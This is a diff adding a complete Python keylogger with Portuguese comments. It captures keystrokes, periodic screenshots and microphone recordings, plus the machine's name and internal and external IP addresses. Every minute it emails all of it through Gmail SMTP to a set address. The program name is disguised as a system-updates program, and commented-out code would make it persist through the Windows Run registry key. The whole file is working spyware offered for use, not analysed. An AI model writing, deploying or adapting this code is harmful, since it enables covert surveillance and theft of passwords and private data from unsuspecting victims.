@@ -1,0 +1,158 @@
+import smtplib
+import threading
+import socket
+import os
+import platform
+import requests
+import pyautogui
+import sounddevice as sd
+from scipy.io.wavfile import write
+from pynput import keyboard
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email.mime.text import MIMEText
+from email import encoders
+from datetime import datetime
+# import winreg as reg  # Persistência comentada
+
+# === Configurações de E-mail ===
+EMAIL_ADDRESS = 'insira seu endereço'
+EMAIL_PASSWORD = 'insira a senha'
+EMAIL_DESTINO = 'insira o endereço de destino'
+SMTP_SERVER = 'smtp.gmail.com'
+SMTP_PORT = 587
+
+# === Configurações Gerais ===
+INTERVALO_ENVIO = 60      # Enviar a cada 60 segundos
+INTERVALO_SCREENSHOT = 120  # Screenshot a cada 120 segundos
+DURACAO_AUDIO = 10        # Duração da gravação de áudio em segundos
+NOME_PROGRAMA = "Atualizações de Sistema"
+
+# === Variáveis ===
+log = ""
+current_keys = set()
+audio_file_path = os.path.join(os.getenv('APPDATA'), 'audio.wav')
+screenshot_path = os.path.join(os.getenv('APPDATA'), 'screenshot.png')
+
+# === Funções de Envio ===
+def enviar_email(anexos=[]):
+    try:
+        msg = MIMEMultipart()
+        msg['From'] = EMAIL_ADDRESS
+        msg['To'] = EMAIL_DESTINO
+        msg['Subject'] = f"Keylogger Report {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+        
+        corpo = obter_informacoes_sistema() + "\n\n" + log
+        msg.attach(MIMEText(corpo, 'plain'))
+        
+        for arquivo in anexos:
+            with open(arquivo, 'rb') as file:
+                part = MIMEBase('application', 'octet-stream')
+                part.set_payload(file.read())
+                encoders.encode_base64(part)
+                part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(arquivo)}')
+                msg.attach(part)
+        
+        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
+            server.starttls()
+            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
+            server.send_message(msg)
+            print("[+] E-mail enviado com sucesso!")
+    except Exception as e:
+        print(f"[-] Falha ao enviar e-mail: {e}")
+
+# === Funções de Captura ===
+def capturar_tecla(key):
+    global log
+    try:
+        if hasattr(key, 'char') and key.char:
+            log += key.char
+        else:
+            log += f'[{key.name}]'
+        
+        current_keys.add(key)
+        detectar_combinacoes()
+
+    except Exception as e:
+        print(f"[!] Erro ao capturar tecla: {e}")
+
+def soltar_tecla(key):
+    try:
+        current_keys.remove(key)
+    except KeyError:
+        pass
+
+def detectar_combinacoes():
+    global log
+    if keyboard.Key.ctrl_l in current_keys and keyboard.KeyCode.from_char('c') in current_keys:
+        log += "[Ctrl+C]"
+    if keyboard.Key.alt_l in current_keys and keyboard.Key.tab in current_keys:
+        log += "[Alt+Tab]"
+
+def tirar_screenshot():
+    try:
+        screenshot = pyautogui.screenshot()
+        screenshot.save(screenshot_path)
+        print("[+] Screenshot capturada.")
+    except Exception as e:
+        print(f"[-] Falha ao tirar screenshot: {e}")
+
+def gravar_audio():
+    try:
+        samplerate = 44100
+        gravacao = sd.rec(int(DURACAO_AUDIO * samplerate), samplerate=samplerate, channels=2)
+        sd.wait()
+        write(audio_file_path, samplerate, gravacao)
+        print("[+] Áudio gravado.")
+    except Exception as e:
+        print(f"[-] Falha ao gravar áudio: {e}")
+
+def obter_informacoes_sistema():
+    try:
+        nome_pc = platform.node()
+        ip_interno = socket.gethostbyname(socket.gethostname())
+        ip_externo = requests.get('https://api.ipify.org').text
+        return (f"[+] Nome do PC: {nome_pc}\n"
+                f"[+] IP Interno: {ip_interno}\n"
+                f"[+] IP Externo: {ip_externo}")
+    except Exception as e:
+        return "[!] Erro ao obter informações do sistema."
+
+# === Envio periódico dos dados ===
+def enviar_periodicamente():
+    global log
+    if log.strip():
+        gravar_audio()
+        tirar_screenshot()
+        enviar_email(anexos=[audio_file_path, screenshot_path])
+        log = ""
+        try:
+            os.remove(audio_file_path)
+            os.remove(screenshot_path)
+        except:
+            pass
+    timer = threading.Timer(INTERVALO_ENVIO, enviar_periodicamente)
+    timer.daemon = True
+    timer.start()
+
+# === Persistência ===
+# def adicionar_autoexecucao():
+#     caminho_atual = os.path.realpath(__file__)
+#     try:
+#         chave = r"Software\Microsoft\Windows\CurrentVersion\Run"
+#         reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, chave, 0, reg.KEY_SET_VALUE)
+#         reg.SetValueEx(reg_key, NOME_PROGRAMA, 0, reg.REG_SZ, caminho_atual)
+#         reg.CloseKey(reg_key)
+#         print("[+] Persistência adicionada com sucesso!")
+#     except Exception as e:
+#         print(f"[-] Falha ao adicionar persistência: {e}")
+
+# === Inicialização Principal ===
+def iniciar():
+    # adicionar_autoexecucao()  # Persistência comentada
+    enviar_periodicamente()
+    with keyboard.Listener(on_press=capturar_tecla, on_release=soltar_tecla) as listener:
+        listener.join()
+
+if __name__ == "__main__":
+    iniciar()
